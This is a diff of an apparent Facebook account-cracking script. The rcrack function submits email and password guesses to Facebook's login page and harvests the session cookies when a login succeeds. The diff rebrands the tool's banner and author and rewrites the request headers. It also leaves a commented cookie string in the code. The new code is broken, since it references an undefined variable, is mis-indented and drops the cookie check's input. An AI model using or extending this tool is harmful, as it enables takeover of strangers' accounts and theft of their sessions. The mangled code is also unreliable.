@@ -31,17 +31,16 @@ my_color = [
 warna = random.choice(my_color)
 logo =  """   
     
-          ###     ######     ###    ########  
-         ## ##   ##    ##   ## ##   ##     ## 
-        ##   ##  ##        ##   ##  ##     ## 
-       ##     ##  ######  ##     ## ##     ## 
-       #########       ## ######### ##     ## 
-       ##     ## ##    ## ##     ## ##     ## 
-       ##     ##  ######  ##     ## ########  
+          ╔══╗─────────────╔╗────────
+║╔╗║─────────────║║────────
+║╚╝║╔══╗╔═╗╔══╗╔═╝║╔══╗╔╗╔╗
+║╔═╝║╔╗║║╔╝║╔╗║║╔╗║║╔╗║╚╬╬╝
+║║──║╔╗║║║─║╔╗║║╚╝║║╚╝║╔╬╬╗
+╚╝──╚╝╚╝╚╝─╚╝╚╝╚══╝╚══╝╚╝╚╝  
 
 ══════════════════════════════════════════════════
-  Author       : Asad Ali
-  Brother      : Kami
+  Author       : Waseem Younas
+  Nick Name    : Paradox
   TOOLS STATUS : free
   Youtube      : Pro
 ══════════════════════════════════════════════════"""
@@ -162,22 +161,26 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority':'free.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9,en;q=0.8,en;q=0.7',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '" Not A;Brand";v="100", "Chromium";v="101"',
-            'sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-             'user-agent':'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25',}
-            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
+            headers = {
+    'authority': 'mbasic.facebook.com',
+    'method': 'POST',
+    'scheme': 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'datr=NsvcY0rDAmmxle1ntfF61kzO; sb=NsvcYwiCPtT5oVjjtglWL9fq; m_pixel_ratio=2.75; wd=393x780; fr=0xtUjGsE2my4Uke8H..Bj3Ms2.E6.AAA.0.0.Bj3Ms5.AWWAbULUyXQ',
+    'sec-ch-ua': '"Google Chrome";v="86", "Chromium";v="86", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/86.0.4240.198 Mobile Safari/537.36',
+}
+
+response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
